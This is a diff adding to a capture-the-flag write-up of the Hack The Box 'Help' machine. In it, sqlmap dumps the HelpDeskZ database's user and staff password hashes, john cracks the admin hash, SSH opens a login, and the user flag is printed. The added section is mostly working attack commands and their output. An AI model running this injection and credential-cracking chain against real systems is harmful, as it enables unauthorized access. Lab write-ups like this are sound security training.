@@ -200,7 +200,7 @@ user    0m0.360s
 sys     0m0.142s
 ```
 
-nice - but.. that does not work for `helpme` or `shiv` on ssh -- but it does get us in to the helpdeskz 
+nice - but.. that does not work for `helpme` or `shiv` on ssh -- but it does get us in to the helpdeskz
 
 and.. we can now use sqlmap to trigger the authenticated exploit that was not working unauthenticated..
 
@@ -243,14 +243,130 @@ database management system users password hashes:
 
 ```
 
-root hash falls 
+root hash falls
 ```
-helpme           (?)     
+helpme           (?)
 ```
 
 but what user does that belong to?
 
 
+fine, dump the whole db
+```
+$ sqlmap -r view_tickets2.txt --level 5 --risk 3 -p param[] --dump --threads=10
+...
+Database: support
+Table: users
+[6 entries]
++----+-----------------------+--------+----------+------------------------------------------+------------------+------------+
+| id | email                 | status | fullname | password                                 | timezone         | salutation |
++----+-----------------------+--------+----------+------------------------------------------+------------------+------------+
+| 1  | helpme@helpme.com     | 1      | helpme   | c3b3bd1eb5142e29adb0044b16ee4d402d06f9ca | Indian/Christmas | 0          |
+| 2  | lolololol@yopmail.com | 1      | xcvxv    | ec09fa0d0ba74336ea7fe392869adb198242f15a | NULL             | 0          |
+| 3  | conor@help.htb        | 1      | fff      | 23fbce4e2719dcca15d18eebdae18e13eeb3ccb1 | NULL             | 0          |
+| 4  | conor@help.htb        | 1      | dfsdfsd  | a08a479d45feedf6bc60135fa9408d97831469c3 | NULL             | 0          |
+| 5  | conor@help.htb        | 1      | c        | 7738886fdcac7cd15657a878b513fabb86613791 | NULL             | 0          |
+| 6  | conor@help.htb        | 1      | fff      | 4a0914c37ec903edac3ac652c8c00dcaa9f48fb5 | NULL             | 0          |
++----+-----------------------+--------+----------+------------------------------------------+------------------+------------+
+
+```
+
+
+we already no `helpme@helpme.com` and `lololol@yopmail.com` isn't popping.
+
+but...
+
+```
+$ cat ~/.local/share/sqlmap/output/help.htb/dump/support/staff.csv.1
+id,admin,email,login,avatar,status,fullname,password,timezone,username,signature,department,last_login,newticket_notification
+1,1,support@mysite.com,1547216217,NULL,Enable,Administrator,d318f44739dced66793b1a603028133a76ae680e (Welcome1),<blank>,admin,"Best regards,\r\nAdministrator","a:1:{i:0;s:1:""1"";}",15434297
+46,0
+```
+
+```
+$ john_rockyou users2.hash
+...
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=16
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Welcome1         (?)
+1g 0:00:00:00 DONE (2022-08-11 19:18) 33.33g/s 1346Kp/s 1346Kc/s 1346KC/s abcdefghijklmnopqrstuvwxyz..TWEETYBIRD
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed.
+
+real    0m0.190s
+user    0m0.051s
+sys     0m0.113s
+```
+
+```
+$ ssh -l help help.htb
+Warning: Permanently added 'help.htb' (ED25519) to the list of known hosts.
+help@help.htb's password:
+Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+You have new mail.
+Last login: Fri Jan 11 06:18:50 2019
+help@help:~$
+```
+
+nice.
+
+### help on up
+
+```
+help@help:~$ ls -la
+total 64
+drwxr-xr-x   7 help help  4096 May  4 08:25 .
+drwxr-xr-x   3 root root  4096 Nov 23  2021 ..
+lrwxrwxrwx   1 root root     9 May  4 06:23 .bash_history -> /dev/null
+-rw-r--r--   1 help help   220 Nov 27  2018 .bash_logout
+-rw-r--r--   1 root root     1 Nov 27  2018 .bash_profile
+-rw-r--r--   1 help help  3771 Nov 27  2018 .bashrc
+drwx------   2 help help  4096 Nov 23  2021 .cache
+drwxr-xr-x   4 help help  4096 Aug 11 14:41 .forever
+drwxrwxrwx   6 root root  4096 May  4 08:27 help
+lrwxrwxrwx   1 root root     9 May  4 06:40 .mysql_history -> /dev/null
+drwxrwxr-x   2 help help  4096 Nov 23  2021 .nano
+drwxrwxr-x 290 help help 12288 Nov 23  2021 .npm
+-rw-rw-r--   1 help help     1 May  4 08:27 npm-debug.log
+-rw-r--r--   1 help help   655 Nov 27  2018 .profile
+-rw-rw-r--   1 help help    66 Nov 28  2018 .selected_editor
+-rw-r--r--   1 root root    33 Aug 11 14:41 user.txt
+help@help:~$ cat user.txt
+0f25a3fbc3ef889f3e3abee1120035dc
+help@help:~$ sudo -l
+[sudo] password for help:
+Sorry, user help may not run sudo on help.
+help@help:~$ crontab -l
+# Edit this file to introduce tasks to be run by cron.
+#
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+#
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').#
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+#
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+#
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+#
+# For more information see the manual pages of crontab(5) and cron(8)
+#
+# m h  dom mon dow   command
+@reboot /usr/local/bin/forever start /home/help/help/dist/bundle.js
+```
 
 
 ## flag
